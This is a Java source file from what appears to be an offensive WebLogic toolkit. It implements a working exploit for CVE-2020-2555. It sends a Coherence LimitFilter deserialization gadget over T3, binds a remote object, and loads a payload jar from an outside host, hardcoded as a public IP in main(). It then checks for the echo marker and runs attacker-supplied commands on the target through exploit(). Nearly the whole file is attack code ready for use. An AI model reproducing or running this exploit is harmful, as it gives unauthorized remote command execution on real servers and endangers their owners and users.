package com.r4v3zn.weblogic.tools.payloads.impl;

import com.r4v3zn.weblogic.tools.annotation.Authors;
import com.r4v3zn.weblogic.tools.annotation.Dependencies;
import com.r4v3zn.weblogic.tools.annotation.Tags;
import com.r4v3zn.weblogic.tools.annotation.Versions;
import com.r4v3zn.weblogic.tools.entity.ContextPojo;
import com.r4v3zn.weblogic.tools.entity.MyException;
import com.r4v3zn.weblogic.tools.gadget.ObjectPayload;
import com.r4v3zn.weblogic.tools.gadget.impl.LimitFilterGadget;
import com.r4v3zn.weblogic.tools.manager.WeblogicTrustManager;
import com.r4v3zn.weblogic.tools.payloads.VulTest;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.jndi.Environment;
import javax.naming.Context;
import javax.naming.NamingException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.List;

import static com.r4v3zn.weblogic.tools.utils.CallUtils.callInfo;
import static com.r4v3zn.weblogic.tools.payloads.impl.S1274489.*;
import static com.r4v3zn.weblogic.tools.utils.SocketUtils.hexStrToBinaryStr;
import static com.r4v3zn.weblogic.tools.utils.StringUtils.getRandomString;
import static com.r4v3zn.weblogic.tools.utils.VersionUtils.getVersion;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: CVE_2020_2555
 * Desc: TODO
 * Date:2020/3/31 21:31
 * Email:woo0nise@gmail.com
 * Company:www.r4v3zn.com
 * @author R4v3zn
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({":LimitFilter"})
@Versions({"12.1.3.0", "12.2.1.3.0", "12.2.1.4.0"})
@Tags({"Nday"})
public class CVE_2020_2555{

    /**
     * 漏洞影响版本
     */
    public static final List<String> VUL_VERSIONS = new ArrayList<String>(){{
        add("12.1.3.0");
        add("12.1.3.0.0");
        add("12.2.1.3.0");
        add("12.2.1.3.0.0");
        add("12.2.1.4.0");
        add("12.2.1.4.0.0");
    }};

    private ClusterMasterRemote remote = null;

    private String bindName = "";

    /**
     * 获取上下文
     * @param url url
     * @return
     * @throws NamingException
     */
    public Context getInitialContext(String url) throws NamingException {
        Environment environment = new Environment();
        environment.setProviderUrl(url);
        environment.setEnableServerAffinity(false);
        environment.setSSLClientTrustManager(new WeblogicTrustManager());
        return environment.getInitialContext();
    }

    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param ip ip
     * @param port 端口
     * @param param 执行参数
     * @return 漏洞存在返回 true 否则返回 false
     * @throws Exception 抛出异常
     */
    public Boolean vulnerable(String ip, Integer port, String... param) throws Exception {
        this.bindName = getRandomString(16);
        ContextPojo contextPojo = rebindAny(ip,port,bindName,param);
        if(contextPojo == null || contextPojo.getContext() == null || contextPojo.getUrlClassLoader() == null){
            return false;
        }
        Context context = contextPojo.getContext();
        URLClassLoader urlClassLoader = contextPojo.getUrlClassLoader();
        String currentOs = System.getProperty("os.name");
        System.out.println("[*] bind name --> "+bindName+" ok !");
        try{
            ClusterMasterRemote poc = (ClusterMasterRemote)context.lookup(bindName);
            this.remote = poc;
            String cmd = "echo a136d86442181f45a4446f5fb8a49f7f";
            cmd += "@@"+currentOs+"####"+ip+":"+port;
            String rsp = poc.getServerLocation(cmd);
            return rsp.contains("a136d86442181f45a4446f5fb8a49f7f");
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }finally {
            System.gc();
            urlClassLoader.close();
        }
    }

    /**
     * 漏洞利用
     * @param ip ip
     * @param port 端口
     * @throws Exception 抛出异常
     */
    public String exploit(String ip, Integer port, String... param) throws Exception {
        String cmd = param[0];
        if(isBlank(cmd)){
            throw new MyException("请输入执行命令");
        }
        return callInfo(cmd, remote);
    }

    /**
     * rebindAny
     * @param ip ip
     * @param port port
     * @param param 参数
     * @return
     * @throws NamingException
     */
    private ContextPojo rebindAny(String ip, Integer port, String bindName, String... param) throws Exception {
        // weblogic version
        String version = getVersion(ip, port);
        System.out.println("[*] weblogic version --> "+version);
        if(isBlank(version) || !VUL_VERSIONS.contains(version)){
            return null;
        }
        String javascriptJarUrl = "";
        if(!version.contains("12.1.3.0") && param.length == 0){
            throw new MyException("please set your javascript file url!");
        }
        if(param.length == 0){
            javascriptJarUrl = "";
        }else{
            javascriptJarUrl = param[0];
        }
//        String protocol = param[1].trim();
        String protocol = "t3";
        String clientProtocol = "t3";
        if("https".equals(protocol)){
            clientProtocol = "t3s";
        }
        URLClassLoader urlClassLoader = null;
        try{
            urlClassLoader = loadJar(version);
        }catch (Exception e){
            e.printStackTrace();
            return null;
        }
        String url = String.format(clientProtocol+"://%s:%s", ip, port);
        Context context = getInitialContext(url);
        ObjectPayload objectPayload = new LimitFilterGadget();
        byte[] bytes = hexStrToBinaryStr(RMI_SERVER_HEX);
        Object object = objectPayload.getObject(bytes,new String[]{bindName, javascriptJarUrl}, RMI_SERVER_NAME, urlClassLoader);
//        Object object = objectPayload.getObject("calc",urlClassLoader);
        try{
            context.rebind("hello", object);
        }catch (Exception e){
            e.printStackTrace();
        }
        ContextPojo contextPojo = new ContextPojo();
        contextPojo.setContext(context);
        contextPojo.setUrlClassLoader(urlClassLoader);
        return contextPojo;
    }

    /**
     * 加载依赖 jar
     * @param version weblogic 版本
     * @return
     */
    private URLClassLoader loadJar(String version) throws Exception {
        String path = this.getClass().getResource("/lib/").getPath();
        for (String vulVersion:VUL_VERSIONS) {
            if(!vulVersion.contains(version)){
                continue;
            }
            version = version.replace(".0.0", ".0");
            String loadPath = path + version+"/"+ DEPENDENCIES;
            System.out.println("[*] load class coherence.jar version --> "+version);
            System.out.println("[*] coherence path --> "+loadPath);
            URL[] urls = new URL[]{new URL("file:"+loadPath)};
            return new URLClassLoader(urls,Thread.currentThread().getContextClassLoader());
        }
        return null;
    }

    public static void main(String[] args) throws Exception {
        String url = "http://192.168.1.6:8080/com.bea.javascript.jar";
//        url = "http://192.168.1.3:9999/com.bea.javascript.jar";
        url = "http://45.32.23.211:8080/com.bea.javascript.jar";
        CVE_2020_2555 vul = new CVE_2020_2555();
        vul.vulnerable("10.10.10.173", 7001, url);
        System.out.println(vul.exploit(null,null,"calc"));
    }
}
